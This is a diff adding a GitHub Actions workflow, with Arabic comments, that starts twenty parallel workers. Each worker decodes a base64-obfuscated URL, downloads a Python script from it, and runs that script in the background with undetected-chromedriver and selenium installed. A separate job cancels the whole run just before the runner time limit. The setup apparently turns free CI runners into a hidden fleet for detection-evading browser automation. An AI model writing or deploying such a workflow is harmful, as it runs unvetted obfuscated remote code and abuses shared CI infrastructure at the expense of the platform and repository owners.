@@ -1,0 +1,95 @@
+name: Horizon Matrix Watcher Engine
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: matrix-engine-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Core Overseer: يراقب المدة القصيرة وينهي جميع العمليات
+  # =================================================================
+  core-overseer:
+    name: "System Overseer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_INTERVAL: 3540
+    steps:
+      - name: Initiate Monitor Process
+        run: |
+          echo "--> [OVERSEER] Monitor initialized for ID: ${{ github.run_id }}"
+          echo "--> [OVERSEER] Standing by for ${WATCH_INTERVAL} seconds."
+
+          sleep "${WATCH_INTERVAL}"
+
+          echo "--> [OVERSEER] Execution window reached. Issuing termination call..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "--> [OVERSEER] Abort command sent successfully."
+
+  # =================================================================
+  # Worker Mesh: تشغيل العقد بالتوازي
+  # =================================================================
+  worker-mesh:
+    name: "Worker-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120]
+
+    steps:
+      # Step 1: تهيئة البيئة
+      - name: Prepare System Environment
+        run: |
+          echo "[STEP 1] Setting up dependencies for Worker-${{ matrix.node_code }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # Step 2: جلب ملف التشغيل
+      - name: Fetch Runner Code
+        run: |
+          echo "[STEP 2] Fetching payload from encoded source..."
+          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$REMOTE_SRC" -o app_runner.py
+          echo "[STEP 2] Payload ready."
+
+      # Step 3: تثبيت حزم المكتبات
+      - name: Deploy Python Libraries
+        run: |
+          echo "[STEP 3] Installing Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # Step 4: تشغيل السكريبت في الخلفية وتتبع وقته
+      - name: Execute App Runner
+        run: |
+          echo "[STEP 4] Executing Worker-${{ matrix.node_code }} payload..."
+
+          python3 app_runner.py &
+          TASK_PID=$!
+
+          echo "[STEP 4] Process backgrounded with PID $TASK_PID. Holding for 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "[STEP 4] Timeout reached. Killing process..."
+            kill -9 "$TASK_PID"
+            echo "[STEP 4] Process terminated."
+          else
+            echo "[STEP 4] Process exited before timeout."
+          fi
